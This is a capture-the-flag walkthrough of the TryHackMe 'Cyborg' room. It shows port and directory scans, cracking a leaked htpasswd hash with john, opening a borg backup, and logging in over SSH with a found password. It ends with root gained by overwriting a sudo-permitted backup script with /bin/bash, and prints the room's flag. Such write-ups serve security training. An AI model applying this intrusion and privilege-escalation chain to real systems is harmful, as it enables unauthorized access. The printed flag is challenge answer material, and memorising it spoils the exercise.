#   Tryhackme - Cyborg
##  IP = 10.10.27.141

##  Walkthrough by
```
Shaswata Saha
12-07-23
11:29PM
```

##  Steps : 
1.  nmap scan
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-12 14:04 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Initiating Ping Scan at 14:04
Scanning 10.10.27.141 [2 ports]
Completed Ping Scan at 14:04, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:04
Completed Parallel DNS resolution of 1 host. at 14:04, 0.16s elapsed
Initiating Connect Scan at 14:04
Scanning 10.10.27.141 [1000 ports]
Discovered open port 80/tcp on 10.10.27.141
Discovered open port 22/tcp on 10.10.27.141
Increasing send delay for 10.10.27.141 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.27.141 from 5 to 10 due to max_successful_tryno increase to 5
Completed Connect Scan at 14:04, 30.40s elapsed (1000 total ports)
Initiating Service scan at 14:04
Scanning 2 services on 10.10.27.141
Completed Service scan at 14:05, 6.64s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.27.141.
Initiating NSE at 14:05
Completed NSE at 14:05, 8.49s elapsed
Initiating NSE at 14:05
Completed NSE at 14:05, 1.18s elapsed
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Nmap scan report for 10.10.27.141
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.01 seconds

```

2.  Gobuster scan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.27.141 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/12 14:11:21 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.27.141/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.27.141/etc/]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1825 / 1829 (99.78%)
===============================================================                              
2023/07/12 14:12:15 Finished                                                                 
===============================================================

```

3.  From the /etc/squid/passwd
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
We still dont know what it is!

4.  Crack the hash using john:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ john Desktop/tryhackme/Cyborg/hash -wordlist=Documents/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2023-07-12 14:28) 1.428g/s 55748p/s 55748c/s 55748C/s wonderfull..pinche
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

5.  Download borg:
```bash
sudo apt-get update

sudo apt install borg backup -y
```

6.  Create a new folder and open / mount the repository with the following command

```bash
mkdir unpacked
borg mount home/field/dev/final_archive unpacked
*put in passphrase*
```

Now our directory unpacked is filled with new files that we can check out.

7.  Let us check the files in archive.tar
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Cyborg]
└─$ tar -xvf archive.tar
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

8.  We see in the unpacked folder:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Cyborg]
└─$ ls unpacked          
music_archive
                                                                                             
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Cyborg]
└─$ cd unpacked/music_archive 
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/tryhackme/Cyborg/unpacked/music_archive]
└─$ ls         
home
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/tryhackme/Cyborg/unpacked/music_archive]
└─$ cd home                  
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/Cyborg/unpacked/music_archive/home]
└─$ ls
alex
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/Cyborg/unpacked/music_archive/home]
└─$ cd alex
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/unpacked/music_archive/home/alex]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/unpacked/music_archive/home/alex]
└─$ cd Documents                       
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/music_archive/home/alex/Documents]
└─$ ls
note.txt
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/music_archive/home/alex/Documents]
└─$ cat note.txt                           
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

9.  Let's ssh into that:
```bash
┌──(subhro1530㉿subhro)-[~/…/music_archive/home/alex/Documents]
└─$ ssh alex@10.10.27.141             
alex@10.10.27.141's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ 
```

10. We get the user.txt file..!

11. Privelege escalation:
```bash
sudo -l
```
Gives all the things the current user can run.

12. Make some modifications in that file which the user can run to open the root shell:
```bash
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh
alex@ubuntu:~$ echo "/bin/bash" > /etc/mp3backups/backup.sh
alex@ubuntu:~$ ./etc/mp3backups/backup.sh
-bash: ./etc/mp3backups/backup.sh: No such file or directory
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
root@ubuntu:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@ubuntu:~# cat /etc/mp3backups/backup.sh
/bin/bash
root@ubuntu:~# /bin/bash
root@ubuntu:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}

```
Yay! We got the root..!